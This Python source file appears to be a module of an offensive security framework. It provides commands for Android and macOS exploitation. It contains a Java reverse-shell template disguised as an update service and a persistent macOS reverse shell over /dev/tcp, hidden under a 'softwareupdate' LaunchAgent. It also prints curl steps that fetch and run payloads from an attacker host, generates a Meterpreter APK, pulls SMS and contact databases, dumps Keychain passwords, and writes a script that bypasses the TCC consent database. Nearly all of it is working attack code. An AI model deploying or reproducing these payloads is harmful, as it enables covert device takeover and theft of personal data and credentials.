"""Mobile & macOS exploitation command set.

Covers Android enumeration and APK generation, macOS persistence and
keychain extraction.
"""

from __future__ import annotations

import os
import re
import shlex
import subprocess

import cmd2

from cli.commands._base import LazyOwnCommandSet
from cli.commands._base import extract_flag as _shared_extract_flag
from core.process import is_binary_present as _core_is_binary_present
from core.validators import check_lhost, check_lport
from utils import (
    print_error,
    print_msg,
    print_warn,
)

MOBILE_CATEGORY = "03. Exploitation"

ANDROID_REVERSE_SHELL_TEMPLATE = """package com.lazyown.update;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class UpdateService {{
    public static void connect() {{
        try {{
            Socket socket = new Socket("{lhost}", {lport});
            Process process = Runtime.getRuntime().exec("/system/bin/sh");
            InputStream inputStream = process.getInputStream();
            InputStream errorStream = process.getErrorStream();
            OutputStream outputStream = process.getOutputStream();
            InputStream socketInputStream = socket.getInputStream();
            OutputStream socketOutputStream = socket.getOutputStream();

            new Thread(() -> {{
                byte[] buffer = new byte[4096];
                int length;
                try {{
                    while ((length = inputStream.read(buffer)) > 0) socketOutputStream.write(buffer, 0, length);
                }} catch (Exception e) {{}}
            }}).start();

            new Thread(() -> {{
                byte[] buffer = new byte[4096];
                int length;
                try {{
                    while ((length = errorStream.read(buffer)) > 0) socketOutputStream.write(buffer, 0, length);
                }} catch (Exception e) {{}}
            }}).start();

            byte[] buffer = new byte[4096];
            int length;
            while ((length = socketInputStream.read(buffer)) > 0) outputStream.write(buffer, 0, length);
        }} catch (Exception e) {{}}
    }}
}}
"""

MACOS_PERSIST_PLIST = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{label}.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{payload_path}</string>
        <string>{lhost}</string>
        <string>{lport}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>"""

MACOS_TCC_BYPASS_SCRIPT = """#!/bin/bash
sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \\
    "INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','{binary}',0,1,1,NULL,NULL,NULL,'UNUSED',NULL,0,1541440109,NULL,NULL,'UNUSED',0);"
"""


class MobileMacOSCommandSet(LazyOwnCommandSet):
    """Mobile and macOS exploitation operations."""

    phase = "exploit"
    category = MOBILE_CATEGORY

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_android_enum(self, line):
        """Enumerate an Android device connected via ADB.

        Usage: android_enum [--serial <device_serial>]

        Dumps device info, installed packages, running processes, and
        sensitive files (SMS, contacts, accounts).
        """
        args = shlex.split(line)
        serial = _extract_flag(args, "--serial")
        if serial and not _SERIAL_RE.match(serial):
            print_error("Invalid --serial value")
            return

        adb_argv = _adb_argv(serial)

        checks = [
            ("Device Info", ["shell", "getprop"]),
            ("Installed Packages", ["shell", "pm", "list", "packages", "-3"]),
            ("Running Processes", ["shell", "ps", "-A"]),
            ("Network Interfaces", ["shell", "ip", "addr", "show"]),
            ("Accounts", ["shell", "dumpsys", "account"]),
        ]

        output_dir = "sessions/android_enum"
        os.makedirs(output_dir, exist_ok=True)

        with open(os.path.join(output_dir, "android_enum.txt"), "w") as out:
            for name, cmd in checks:
                print_msg(f"  {name}...")
                try:
                    result = subprocess.run(
                        adb_argv + cmd,
                        shell=False,
                        timeout=15,
                        capture_output=True,
                        text=True,
                    )
                    out.write(f"\n{'=' * 60}\n{name}\n{'=' * 60}\n")
                    out.write(result.stdout)
                    out.write(result.stderr if result.stderr else "")
                except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                    print_warn(f"  {name}: {e}")

        print_msg(f"Results saved to {output_dir}/android_enum.txt")

        print_msg("\nAttempting data extraction (requires root)...")
        extract_sensitive = [
            ("/data/data/com.android.providers.telephony/databases/mmssms.db", "sms.db"),
            ("/data/data/com.android.providers.contacts/databases/contacts2.db", "contacts.db"),
        ]
        for src, dst_name in extract_sensitive:
            dst = os.path.join(output_dir, dst_name)
            try:
                subprocess.run(
                    adb_argv + ["pull", src, dst],
                    shell=False,
                    timeout=15,
                    stderr=subprocess.DEVNULL,
                )
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    print_msg(f"  Extracted: {dst_name}")
                else:
                    print_warn(f"  Failed: {dst_name} (root required or file not found)")
            except Exception:
                pass

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_android_apk(self, line):
        """Generate a malicious APK with reverse shell payload.

        Usage: android_apk [--lhost <ip>] [--lport <port>] [--output <path>]

        Generates an Android APK using msfvenom with a Meterpreter reverse
        TCP payload. Requires msfvenom to be installed.
        """
        args = shlex.split(line)
        lhost = _extract_flag(args, "--lhost") or self.params.get("lhost", "")
        lport = _extract_flag(args, "--lport") or self.params.get("lport", "4444")
        output = _extract_flag(args, "--output") or "sessions/payload.apk"

        if not check_lhost(lhost) or not check_lport(lport):
            return
        if not _is_safe_output_path(output):
            print_error("Invalid --output path")
            return

        if not is_binary_present("msfvenom"):
            print_error("msfvenom required. Install metasploit-framework.")
            return

        argv = [
            "msfvenom",
            "-p",
            "android/meterpreter/reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-o",
            output,
        ]
        print_msg(f"Generating APK: {' '.join(argv)}")
        try:
            result = subprocess.run(argv, shell=False, timeout=60, capture_output=True, text=True)
            if os.path.exists(output):
                print_msg(f"APK generated: {output} ({os.path.getsize(output)} bytes)")
                print_msg(f"Deploy via ADB: adb install {output}")
                print_msg("Or host it: python3 -m http.server 8080")
            else:
                print_error(f"APK generation failed: {result.stderr}")
        except FileNotFoundError:
            print_error("msfvenom not found")

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_macos_persist(self, line):
        """Generate macOS persistence via LaunchAgent.

        Usage: macos_persist [--lhost <ip>] [--lport <port>] [--label <name>]

        Creates a LaunchAgent plist that executes a reverse shell at login
        and keeps it alive every 5 minutes.
        """
        args = shlex.split(line)
        lhost = _extract_flag(args, "--lhost") or self.params.get("lhost", "")
        lport = _extract_flag(args, "--lport") or self.params.get("lport", "4444")
        label = _extract_flag(args, "--label") or "softwareupdate"

        if not check_lhost(lhost) or not check_lport(lport):
            return
        if not _LABEL_RE.match(label):
            print_error("Invalid --label value")
            return

        payload = (
            f"#!/bin/bash\nwhile true; do\n  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null\n  sleep 60\ndone"
        )

        payload_path = f"/tmp/.{label}"
        plist_name = f"com.{label}.agent.plist"
        launch_agents_path = f"$HOME/Library/LaunchAgents/{plist_name}"

        plist_content = MACOS_PERSIST_PLIST.format(
            label=label,
            payload_path=payload_path,
            lhost=lhost,
            lport=lport,
        )

        output_dir = "sessions/macos_persist"
        os.makedirs(output_dir, exist_ok=True)

        payload_file = os.path.join(output_dir, f".{label}")
        plist_file = os.path.join(output_dir, plist_name)

        with open(payload_file, "w") as f:
            f.write(payload)
        with open(plist_file, "w") as f:
            f.write(plist_content)

        print_msg("Run these commands on the macOS target:")
        print_msg("  1. Upload and execute payload:")
        print_msg(
            f"     curl -o {payload_path} http://{lhost}:8080/.{label} && chmod +x {payload_path} && nohup {payload_path} &"
        )
        print_msg("  2. Install LaunchAgent:")
        print_msg(f"     curl -o {launch_agents_path} http://{lhost}:8080/{plist_name}")
        print_msg(f"     launchctl load {launch_agents_path}")
        print_msg("")
        print_msg(f"Files generated in {output_dir}/")
        print_msg("Start HTTP server: python3 -m http.server 8080")

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_macos_keychain(self, line):
        """Extract secrets from the macOS Keychain.

        Usage: macos_keychain [--target <ip>] [--user <username>]

        Generates commands to dump keychain items (passwords, certs, keys)
        from the target Mac.
        """
        args = shlex.split(line)
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user") or ""

        commands = [
            ["security", "dump-keychain", "-d", "login.keychain"],
            ["security", "dump-keychain", "-d", "/Library/Keychains/System.keychain"],
            ["security", "find-generic-password", "-wa"],
            ["security", "find-internet-password", "-wa"],
            ["security", "find-identity", "-v", "-p", "codesigning"],
        ]

        if target:
            from core.validators import check_rhost

            if not check_rhost(target):
                return
            if user and not _USER_RE.match(user):
                print_error("Invalid --user value")
                return
            destination = f"{user}@{target}" if user else target
            for cmd in commands:
                print_msg(f"  ssh {destination} {' '.join(cmd)}")
                try:
                    result = subprocess.run(
                        ["ssh", destination] + cmd,
                        shell=False,
                        timeout=15,
                        capture_output=True,
                        text=True,
                    )
                    if result.stdout.strip():
                        print_msg(result.stdout[:500])
                except Exception:
                    pass
        else:
            print_msg("Run these commands on the macOS target:")
            for cmd in commands:
                print_msg(f"  {' '.join(cmd)}")

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_macos_tcc(self, line):
        """Generate macOS TCC (Transparency, Consent, Control) bypass.

        Usage: macos_tcc --binary <app_path>

        Inserts an accessibility permission entry into the TCC database,
        bypassing the user consent dialog for the specified binary.
        Requires Full Disk Access or SIP disabled.
        """
        args = shlex.split(line)
        binary = _extract_flag(args, "--binary")

        if not binary:
            print_error("Usage: macos_tcc --binary <app_path> (e.g. /usr/bin/osascript)")
            return

        script = MACOS_TCC_BYPASS_SCRIPT.format(binary=binary)
        output_path = "sessions/macos_tcc_bypass.sh"
        os.makedirs("sessions", exist_ok=True)
        with open(output_path, "w") as f:
            f.write(script)
        os.chmod(output_path, 0o755)

        print_msg(f"Generated TCC bypass script: {output_path}")
        print_msg("Requirements: Full Disk Access or SIP disabled")
        print_msg(f"Usage on target: sudo bash {output_path}")


def _extract_flag(args: list[str], flag: str) -> str | None:
    """Extract a ``--flag <value>`` pair, delegates to shared helper."""
    return _shared_extract_flag(args, flag)


_SERIAL_RE = re.compile(r"^[A-Za-z0-9._:-]{1,64}$")
_USER_RE = re.compile(r"^[A-Za-z0-9._-]{1,32}$")
_LABEL_RE = re.compile(r"^[A-Za-z0-9._-]{1,32}$")


def _adb_argv(serial: str | None) -> list[str]:
    """Return ADB argv with optional validated serial."""
    if serial:
        return ["adb", "-s", serial]
    return ["adb"]


def _is_safe_output_path(path: str) -> bool:
    """Restrict generated artefacts to sessions/ tree."""
    normalized = os.path.normpath(path)
    return normalized == "sessions" or normalized.startswith("sessions" + os.sep)


def is_binary_present(name: str) -> bool:
    """Check if a binary is available on PATH, delegates to core."""
    if not _LABEL_RE.match(name):
        return False
    return _core_is_binary_present(name)


__all__ = ["MobileMacOSCommandSet"]
